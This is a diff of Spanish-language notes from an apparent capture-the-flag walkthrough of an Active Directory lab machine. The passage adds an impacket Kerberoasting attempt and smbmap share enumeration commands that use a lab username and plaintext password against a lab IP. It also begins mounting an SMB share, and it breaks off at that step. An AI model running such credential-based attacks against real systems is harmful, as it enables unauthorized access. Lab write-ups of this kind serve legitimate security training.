@@ -112,19 +112,14 @@ También podemos ver que existe un grupo llamado `AD Recicle Bin` que en un futu
 Al tener unas credenciales validas podemos probar a hacer un ataque de [[Kerberoasting]]
 
 ### Kerberoasting
+```shell
+impacket-GetUserSPNs cascade.local/r.thompson:rY4n5eva
+```
+
+Al no tener respuesta es que no es Kerberoasteable
 
 
-
-
-
-
-
-
-
-
-
-
-
+## SMB
 
 Enumeraremos los recursos compartidos
 ```shell
@@ -144,3 +139,20 @@ print$          READ            Printer Drivers
 SYSVOL          READ            Logon server share 
 ```
 
+También lo enumeramos con [[SMBMAP]]
+```shell
+smbmap -H  10.129.9.250 -u 'r.thompson' -p 'rY4n5eva'
+```
+
+Vemos un recurso llamado `Data` vamos a acceder a el
+```shell
+smbmap -H  10.129.9.250 -u 'r.thompson' -p 'rY4n5eva' -r Data
+```
+
+Para poder acceder al recurso compartido a través de terminal lo que haremos será jugar con monturas y poder acceder a el mas cómodamente
+Primero crearemos el directorio
+```shell
+mkdir /mnt/smbmounted
+```
+
+Creamos la montura
